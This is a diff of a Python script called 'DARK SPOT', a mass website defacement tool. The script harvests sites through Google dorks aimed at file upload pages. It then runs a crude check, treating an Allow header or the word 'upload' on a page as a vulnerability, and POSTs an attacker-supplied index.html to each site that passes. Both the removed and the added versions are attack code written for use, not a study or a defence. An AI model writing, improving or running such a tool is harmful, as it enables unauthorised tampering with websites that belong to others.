@@ -1,69 +1,103 @@
 import requests
-from colorama import Fore, init
-import os
+from bs4 import BeautifulSoup
 import pyfiglet
-from googlesearch import search
+from colorama import Fore, Style, init
+import os
+import urllib.parse
 
-# Initialize colorama for colored output
-init(autoreset=True)
+# Initialize colorama
+init()
 
-# Display the tool's name using pyfiglet
-ascii_banner = pyfiglet.figlet_format("DARK SPOT")
-print(Fore.RED + ascii_banner)
+# Display the name using pyfiglet
+def display_banner():
+    banner = pyfiglet.figlet_format("DARK SPOT", font="slant")
+    print(Fore.CYAN + banner + Style.RESET_ALL)
 
-# Function to use Google Dorks to get a list of sites
-def get_sites_from_dorks(dorks, num_results=10):
-    sites = []
-    for dork in dorks:
-        print(Fore.YELLOW + f"[*] Searching using dork: {dork}")
-        try:
-            for result in search(dork, num_results=num_results):
-                sites.append(result)
-                print(Fore.GREEN + f"[+] Found site: {result}")
-        except Exception as e:
-            print(Fore.RED + f"[-] Error while searching with dork: {dork} - {e}")
-    return sites
-
-# Function to check for file upload vulnerabilities and try to upload the index
-def upload_index(site, index_file):
+# Function to check if a URL is vulnerable to WebDAV or file upload
+def check_vulnerability(url):
     try:
-        # Attempt to upload the index file using POST
-        files = {'file': ('index.html', open(index_file, 'rb'), 'text/html')}
-        response = requests.post(site, files=files)
+        # Check for WebDAV vulnerability
+        response = requests.options(url)
+        if 'OPTIONS' in response.headers.get('Allow', ''):
+            return True
+        
+        # Check for file upload vulnerability
+        response = requests.get(url)
+        if 'upload' in response.text.lower():
+            return True
 
-        # Check the response status
+    except requests.RequestException:
+        pass
+
+    return False
+
+# Function to upload index.html to a vulnerable URL
+def upload_index(url, index_file_path):
+    try:
+        files = {'file': open(index_file_path, 'rb')}
+        response = requests.post(url, files=files)
         if response.status_code == 200:
-            print(Fore.GREEN + f"[+] Successfully uploaded index to: {site}")
+            print(Fore.GREEN + f"Successfully uploaded index.html to {url}" + Style.RESET_ALL)
         else:
-            print(Fore.RED + f"[-] Failed to upload index to: {site} - Status code: {response.status_code}")
-    except requests.exceptions.RequestException as e:
-        print(Fore.RED + f"[-] Connection error to {site}: {e}")
+            print(Fore.RED + f"Failed to upload index.html to {url}" + Style.RESET_ALL)
+    except requests.RequestException as e:
+        print(Fore.RED + f"Error occurred: {e}" + Style.RESET_ALL)
+
+# Function to search for vulnerable sites based on given dorks
+def search_vulnerable_sites(dorks):
+    urls = set()  # Using a set to avoid duplicates
+    for dork in dorks:
+        search_url = f"https://www.google.com/search?q={urllib.parse.quote(dork)}"
+        try:
+            response = requests.get(search_url)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            for a in soup.find_all('a', href=True):
+                if 'url?q=' in a['href']:
+                    link = a['href'].split('url?q=')[1].split('&')[0]
+                    if 'http' in link:
+                        urls.add(link)
+        except requests.RequestException:
+            print(Fore.RED + f"Error occurred during Google search with dork: {dork}" + Style.RESET_ALL)
+    return list(urls)
 
 # Main function
 def main():
-    # List of Google Dorks used to search for sites
-    dorks = [
-        "inurl:/upload.php", "inurl:/file_upload.php", "inurl:/admin/upload.php",
-        "intitle:'index of /upload'", "inurl:/upload.html", "inurl:/upload.aspx",
-        "intitle:'index of' intext:'upload'", "inurl:/upload.jsp", "inurl:/upload.aspx"
-    ]
-
-    # Request the index file path from the user
-    index_file = input(Fore.YELLOW + "Enter the path to the index file (e.g., index.html): ")
-
-    # Check if the index file exists
-    if not os.path.isfile(index_file):
-        print(Fore.RED + f"[-] Index file not found at path: {index_file}")
+    display_banner()
+    
+    index_file_path = input("Enter the path to the index.html file: ").strip()
+    
+    if not os.path.isfile(index_file_path):
+        print(Fore.RED + "The index.html file does not exist." + Style.RESET_ALL)
         return
+    
+    # Expanded list of dorks for searching vulnerable sites
+    dorks = [
+        'file upload vulnerability',
+        'WebDAV vulnerability',
+        'site:*.php?file=upload',
+        'intitle:"Index of" upload',
+        'inurl:upload',
+        'inurl:admin/upload',
+        'inurl:uploadfile',
+        'intitle:"File Upload"'
+        # Add more dorks as needed
+    ]
+    
+    print(Fore.YELLOW + "Searching for vulnerable sites..." + Style.RESET_ALL)
+    vulnerable_sites = search_vulnerable_sites(dorks)
+    
+    if not vulnerable_sites:
+        print(Fore.RED + "No vulnerable sites found." + Style.RESET_ALL)
+        return
+    
+    print(Fore.YELLOW + f"Found {len(vulnerable_sites)} vulnerable sites. Attempting to upload index.html..." + Style.RESET_ALL)
+    
+    for site in vulnerable_sites:
+        if check_vulnerability(site):
+            print(Fore.YELLOW + f"Site {site} is vulnerable. Attempting to upload index.html..." + Style.RESET_ALL)
+            upload_index(site, index_file_path)
+        else:
+            print(Fore.BLUE + f"Site {site} is not vulnerable or can't be reached." + Style.RESET_ALL)
 
-    # Get sites using the Google Dorks
-    sites = get_sites_from_dorks(dorks, num_results=10)
-
-    # Attempt to upload the index to each site
-    for site in sites:
-        print(Fore.BLUE + f"[*] Attempting to upload to site: {site}")
-        upload_index(site, index_file)
-
-# Run the main function
 if __name__ == "__main__":
     main()
